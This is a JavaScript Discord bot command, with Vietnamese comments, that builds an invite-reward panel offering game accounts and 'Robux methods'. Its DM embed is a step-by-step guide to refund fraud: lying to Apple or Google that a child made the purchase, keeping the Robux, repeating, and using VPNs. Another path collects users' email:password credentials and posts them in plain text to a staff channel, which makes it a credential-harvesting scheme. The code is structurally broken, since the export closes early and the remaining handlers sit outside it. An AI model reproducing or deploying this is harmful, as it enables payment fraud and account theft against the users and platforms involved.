import { SlashCommandBuilder } from '@discordjs/builders';
import { PermissionFlagsBits } from 'discord.js';

const activePayouts = new Map();
const userActiveRequests = new Map();

export default {
    data: new SlashCommandBuilder()
        .setName('panelpayout')
        .setDescription('Create invite rewards panel')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    async execute(interaction) {
        if (!interaction.member?.permissions?.has(PermissionFlagsBits.Administrator)) {
            return interaction.reply({
                content: '❌ You do not have permission to use this command.',
                ephemeral: true
            });
        }
    }
};

        // Hỏi màu embed
        const colorModal = new ModalBuilder()
            .setCustomId('colorModal')
            .setTitle('Embed Color Configuration');
        const colorInput = new TextInputBuilder()
            .setCustomId('colorInput')
            .setLabel('Enter embed color (hex code, e.g., #FF0000):')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
            .setPlaceholder('#FF0000');
        const actionRow = new ActionRowBuilder().addComponents(colorInput);
        colorModal.addComponents(actionRow);
        await interaction.showModal(colorModal);
        // Xử lý khi modal submit
        const filter = (i) => i.customId === 'colorModal';
        try {
            const modalInteraction = await interaction.awaitModalSubmit({
                filter,
                time: 60000
            });
            const color = modalInteraction.fields.getTextInputValue('colorInput');
            // Tạo embed
            const embed = new EmbedBuilder()
                .setColor(color)
                .setTitle('<a:diamond1:1430167258302255195> INVITE REWARD <a:diamond1:1430167258302255195>')
                .setDescription(`
**<a:Minecraft:1430164882736545934> Minecraft <a:Minecraft:1430164882736545934>**
• 2 invites <a:Arrow:1430164794538856580> Minecraft Account (Non-Full Access)
• 5 invites <a:Arrow:1430164794538856580> 3 Minecraft Account (Non Full Access)

**<a:xbox_live:1430165930377351329> Xbox <a:xbox_live:1430165930377351329>**
• 5 invites <a:Arrow:1430164794538856580> Xbox GamePass Account
• 8 invites <a:Arrow:1430164794538856580> Xbox Ultimate Account

**<:method:1430165112626614283> Methods <:method:1430165112626614283>**
• 1 invite <a:Arrow:1430164794538856580> Robux Method
• 5 invites <a:Arrow:1430164794538856580> 1k method (old but working)
• 10 invites <a:Arrow:1430164794538856580> 3k method (old but working)
                `)
                .setFooter({ text: 'All rewards will be sent via DM • One active request per user' });
            // Tạo nút
            const button = new ButtonBuilder()
                .setCustomId('selectService')
                .setLabel('Claim Reward')
                .setStyle(ButtonStyle.Primary)
                .setEmoji('🎁');
            const row = new ActionRowBuilder().addComponents(button);
            await modalInteraction.reply({
                content: '✅ Payout panel created successfully!',
                ephemeral: true
            });
            await modalInteraction.channel?.send({
                embeds: [embed],
                components: [row]
            });
        }
        catch (error) {
            await interaction.followUp({
                content: '❌ Color selection timed out.',
                ephemeral: true
            });
        }
    },
    // Xử lý tương tác nút
    async handleButton(interaction) {
        if (interaction.customId === 'selectService') {
            // Kiểm tra nếu user đã có request active
            if (userActiveRequests.has(interaction.user.id)) {
                const currentService = userActiveRequests.get(interaction.user.id);
                return interaction.reply({
                    content: `❌ You already have an active payout request for: **${currentService}**. Please complete or cancel it before selecting another service.`,
                    ephemeral: true
                });
            }
            const selectMenu = new StringSelectMenuBuilder()
                .setCustomId('serviceSelect')
                .setPlaceholder('Select your reward service')
                .addOptions([
                {
                    label: 'Minecraft Account (2 invites)',
                    value: 'minecraft_2',
                    description: 'Minecraft Account - Non-Full Access',
                    emoji: { id: '1430164882736545934' }
                },
                {
                    label: '3 Minecraft Accounts (5 invites)',
                    value: 'minecraft_5',
                    description: '3 Minecraft Accounts - Non-Full Access',
                    emoji: { id: '1430164882736545934' }
                },
                {
                    label: 'Xbox GamePass (5 invites)',
                    value: 'xbox_gamepass',
                    description: 'Xbox GamePass Account',
                    emoji: { id: '1430165930377351329' }
                },
                {
                    label: 'Xbox Ultimate (8 invites)',
                    value: 'xbox_ultimate',
                    description: 'Xbox Ultimate Account',
                    emoji: { id: '1430165930377351329' }
                },
                {
                    label: 'Robux Method (1 invite)',
                    value: 'robux_method',
                    description: 'Instant Robux Method Guide',
                    emoji: { id: '1430165112626614283' }
                },
                {
                    label: '1k Method (5 invites)',
                    value: '1k_method',
                    description: 'Requires ticket creation',
                    emoji: { id: '1430165112626614283' }
                },
                {
                    label: '3k Method (10 invites)',
                    value: '3k_method',
                    description: 'Requires ticket creation',
                    emoji: { id: '1430165112626614283' }
                }
            ]);
            const row = new ActionRowBuilder().addComponents(selectMenu);
            await interaction.reply({
                content: '🎯 **Please select the service you want to claim:**',
                components: [row],
                ephemeral: true
            });
        }
    },
    // Xử lý select menu
    async handleSelectMenu(interaction) {
        if (interaction.customId === 'serviceSelect') {
            const selectedService = interaction.values[0];
            // Kiểm tra lại nếu user đã có request active
            if (userActiveRequests.has(interaction.user.id)) {
                const currentService = userActiveRequests.get(interaction.user.id);
                return interaction.reply({
                    content: `❌ You already have an active payout request for: **${currentService}**. Please complete or cancel it before selecting another service.`,
                    ephemeral: true
                });
            }
            const serviceMap = {
                'minecraft_2': { name: 'Minecraft Account (2 invites)', invites: 2, requiresTicket: false },
                'minecraft_5': { name: '3 Minecraft Accounts (5 invites)', invites: 5, requiresTicket: false },
                'xbox_gamepass': { name: 'Xbox GamePass Account (5 invites)', invites: 5, requiresTicket: false },
                'xbox_ultimate': { name: 'Xbox Ultimate Account (8 invites)', invites: 8, requiresTicket: false },
                'robux_method': { name: 'Robux Method (1 invite)', invites: 1, requiresTicket: false },
                '1k_method': { name: '1k Method (5 invites)', invites: 5, requiresTicket: true },
                '3k_method': { name: '3k Method (10 invites)', invites: 10, requiresTicket: true }
            };
            const service = serviceMap[selectedService];
            if (!service) {
                return interaction.reply({
                    content: '❌ Invalid service selected.',
                    ephemeral: true
                });
            }
            // Tạo payout request
            const payoutRequest = {
                userId: interaction.user.id,
                service: service.name,
                invitesRequired: service.invites,
                status: 'pending',
                timestamp: new Date()
            };
            activePayouts.set(interaction.user.id, payoutRequest);
            userActiveRequests.set(interaction.user.id, service.name);
            // Xử lý các service cần ticket
            if (service.requiresTicket) {
                const ticketChannelId = '1429770480323133471';
                const embed = new EmbedBuilder()
                    .setColor(0xFFA500)
                    .setTitle('🎫 Ticket Required')
                    .setDescription(`For **${service.name}**, you need to create a ticket in <#${ticketChannelId}> to proceed with your payout request.`)
                    .addFields({ name: 'Service', value: service.name, inline: true }, { name: 'Invites Required', value: `${service.invites}`, inline: true }, { name: 'Status', value: '🟡 Pending Ticket', inline: true })
                    .setFooter({ text: 'Please create a ticket to continue' });
                await interaction.reply({
                    embeds: [embed],
                    ephemeral: true
                });
                // Gửi request đến channel payout
                const payoutChannel = interaction.client.channels.cache.get('1429777854425464872');
                if (payoutChannel && payoutChannel.isTextBased()) {
                    const payoutEmbed = new EmbedBuilder()
                        .setColor(0x00FF00)
                        .setTitle('📦 New Payout Request')
                        .setDescription(`User: <@${interaction.user.id}> (\`${interaction.user.tag}\`)`)
                        .addFields({ name: 'Service', value: service.name, inline: true }, { name: 'Invites Required', value: `${service.invites}`, inline: true }, { name: 'Ticket Required', value: '✅ Yes', inline: true }, { name: 'Status', value: '🟡 Waiting for Ticket', inline: true })
                        .setTimestamp();
                    await payoutChannel.send({ embeds: [payoutEmbed] });
                }
            }
            else if (selectedService === 'robux_method') {
                // Xử lý Robux Method (không cần modal)
                const confirmButton = new ButtonBuilder()
                    .setCustomId(`confirm_robux_${interaction.user.id}`)
                    .setLabel('Get Robux Method')
                    .setStyle(ButtonStyle.Success)
                    .setEmoji('💰');
                const cancelButton = new ButtonBuilder()
                    .setCustomId(`cancel_robux_${interaction.user.id}`)
                    .setLabel('Cancel')
                    .setStyle(ButtonStyle.Danger)
                    .setEmoji('❌');
                const row = new ActionRowBuilder().addComponents(confirmButton, cancelButton);
                const embed = new EmbedBuilder()
                    .setColor(0x00FF00)
                    .setTitle('🤖 Robux Method Confirmation')
                    .setDescription(`You selected: **${service.name}**\n\nClick the button below to receive the Robux method guide immediately via DM.`)
                    .setFooter({ text: 'This method will be sent directly to your DMs' });
                await interaction.reply({
                    embeds: [embed],
                    components: [row],
                    ephemeral: true
                });
            }
            else {
                // Các service khác cần account info
                const confirmButton = new ButtonBuilder()
                    .setCustomId(`confirm_${interaction.user.id}`)
                    .setLabel('Provide Account Info')
                    .setStyle(ButtonStyle.Success)
                    .setEmoji('📝');
                const cancelButton = new ButtonBuilder()
                    .setCustomId(`cancel_${interaction.user.id}`)
                    .setLabel('Cancel')
                    .setStyle(ButtonStyle.Danger)
                    .setEmoji('❌');
                const row = new ActionRowBuilder().addComponents(confirmButton, cancelButton);
                const embed = new EmbedBuilder()
                    .setColor(0x00FF00)
                    .setTitle('✅ Service Selected')
                    .setDescription(`You selected: **${service.name}**\n\nClick the button below to provide your account information in the required format.`)
                    .addFields({ name: 'Required Format', value: '`email:password`', inline: false }, { name: 'Invites Required', value: `${service.invites}`, inline: true })
                    .setFooter({ text: 'Please have your account credentials ready' });
                await interaction.reply({
                    embeds: [embed],
                    components: [row],
                    ephemeral: true
                });
            }
        }
    },
    // Xử lý confirm/cancel buttons
    async handleConfirmButton(interaction) {
        if (interaction.customId.startsWith('confirm_robux_')) {
            const userId = interaction.customId.replace('confirm_robux_', '');
            if (interaction.user.id !== userId) {
                return interaction.reply({
                    content: '❌ This button is not for you.',
                    ephemeral: true
                });
            }
            // Gửi Robux Method qua DM
            const robuxEmbed = new EmbedBuilder()
                .setColor(0x9C59B6)
                .setTitle('💰 ROBUX METHOD GUIDE')
                .setDescription(`
**Requirements:**
- Apple or Android device
- iTunes or Google Play money (Enough to buy any robux amount)

**Steps:**
1. Buy the robux on your device.
2. Spend them before doing the next step
3. Go to https://www.reportaproblem.apple.com/ (or report it on Google Play)
4. Sign into your account
5. Click on the bar and swipe in on "Request a refund"
6. Put this specific reason (or similar): 
   \`I need a refund because my 5 years old son was playing Roblox and he made this purchase by mistake.\`
   Other reason like 'I did not receive the product' or 'I did not want to buy this' is not effective.
7. Finish the report
8. Wait 6-48 hours and you will get your money back.
9. Notice how what you purchased is still working, they will not delete it.
10. Repeat and you will have infinite robux

**Notes:** 
- Do not overdo it, once or twice a week with different amounts.
- Using different VPN is even better.
                `)
                .setFooter({ text: 'Use this method responsibly • All rewards are sent via DM' });
            try {
                await interaction.user.send({ embeds: [robuxEmbed] });
                // Cập nhật status
                const payoutRequest = activePayouts.get(userId);
                if (payoutRequest) {
                    payoutRequest.status = 'completed';
                    // Log vào history channel
                    const historyChannel = interaction.client.channels.cache.get('1429770521104486433');
                    if (historyChannel && historyChannel.isTextBased()) {
                        const historyEmbed = new EmbedBuilder()
                            .setColor(0x00FF00)
                            .setTitle('📝 Payout Completed')
                            .setDescription(`User: <@${userId}> (\`${interaction.user.tag}\`)`)
                            .addFields({ name: 'Service', value: payoutRequest.service, inline: true }, { name: 'Invites', value: `${payoutRequest.invitesRequired}`, inline: true }, { name: 'Status', value: '✅ Completed', inline: true }, { name: 'Method', value: 'Direct DM', inline: true })
                            .setTimestamp();
                        await historyChannel.send({ embeds: [historyEmbed] });
                    }
                }
                userActiveRequests.delete(userId);
                await interaction.reply({
                    content: '✅ Robux method has been sent to your DMs! Please check your private messages.',
                    ephemeral: true
                });
            }
            catch (error) {
                await interaction.reply({
                    content: '❌ I cannot send you a DM. Please enable DMs and try again.',
                    ephemeral: true
                });
            }
        }
        else if (interaction.customId.startsWith('confirm_')) {
            const userId = interaction.customId.replace('confirm_', '');
            if (interaction.user.id !== userId) {
                return interaction.reply({
                    content: '❌ This button is not for you.',
                    ephemeral: true
                });
            }
            // Hiển thị modal để nhập account info
            const modal = new ModalBuilder()
                .setCustomId(`accountModal_${userId}`)
                .setTitle('Account Information');
            const accountInput = new TextInputBuilder()
                .setCustomId('accountInput')
                .setLabel('Enter your account credentials')
                .setStyle(TextInputStyle.Paragraph)
                .setRequired(true)
                .setPlaceholder('email:password')
                .setMaxLength(500);
            const modalRow = new ActionRowBuilder().addComponents(accountInput);
            modal.addComponents(modalRow);
            await interaction.showModal(modal);
        }
    },
    // Xử lý cancel buttons
    async handleCancelButton(interaction) {
        const userId = interaction.customId.replace('cancel_', '').replace('_robux', '');
        if (interaction.user.id !== userId) {
            return interaction.reply({
                content: '❌ This button is not for you.',
                ephemeral: true
            });
        }
        // Xóa request
        activePayouts.delete(userId);
        userActiveRequests.delete(userId);
        await interaction.reply({
            content: '❌ Payout request has been cancelled.',
            ephemeral: true
        });
    },
    // Xử lý modal submit
    async handleModalSubmit(interaction) {
        if (interaction.customId.startsWith('accountModal_')) {
            const userId = interaction.customId.replace('accountModal_', '');
            const accountInfo = interaction.fields.getTextInputValue('accountInput');
            // Validate format
            if (!accountInfo.includes(':')) {
                return interaction.reply({
                    content: '❌ Invalid format! Please use the format: `email:password`',
                    ephemeral: true
                });
            }
            // Cập nhật payout request
            const payoutRequest = activePayouts.get(userId);
            if (payoutRequest) {
                payoutRequest.accountInfo = accountInfo;
                payoutRequest.status = 'completed';
                // Gửi đến payout channel
                const payoutChannel = interaction.client.channels.cache.get('1429777854425464872');
                if (payoutChannel && payoutChannel.isTextBased()) {
                    const payoutEmbed = new EmbedBuilder()
                        .setColor(0x00FF00)
                        .setTitle('📦 Payout Request - Account Provided')
                        .setDescription(`User: <@${userId}> (\`${interaction.user.tag}\`)`)
                        .addFields({ name: 'Service', value: payoutRequest.service, inline: true }, { name: 'Invites Required', value: `${payoutRequest.invitesRequired}`, inline: true }, { name: 'Account Info', value: `\`\`\`${accountInfo}\`\`\``, inline: false }, { name: 'Status', value: '✅ Ready for Processing', inline: true })
                        .setTimestamp();
                    await payoutChannel.send({ embeds: [payoutEmbed] });
                }
                // Log vào history channel
                const historyChannel = interaction.client.channels.cache.get('1429770521104486433');
                if (historyChannel && historyChannel.isTextBased()) {
                    const historyEmbed = new EmbedBuilder()
                        .setColor(0x00FF00)
                        .setTitle('📝 Payout Request Submitted')
                        .setDescription(`User: <@${userId}> (\`${interaction.user.tag}\`)`)
                        .addFields({ name: 'Service', value: payoutRequest.service, inline: true }, { name: 'Invites', value: `${payoutRequest.invitesRequired}`, inline: true }, { name: 'Status', value: '🟡 Processing', inline: true })
                        .setTimestamp();
                    await historyChannel.send({ embeds: [historyEmbed] });
                }
                userActiveRequests.delete(userId);
                await interaction.reply({
                    content: '✅ Your account information has been submitted successfully! The reward will be sent to your DMs soon.',
                    ephemeral: true
                });
            }
        }
    }
};
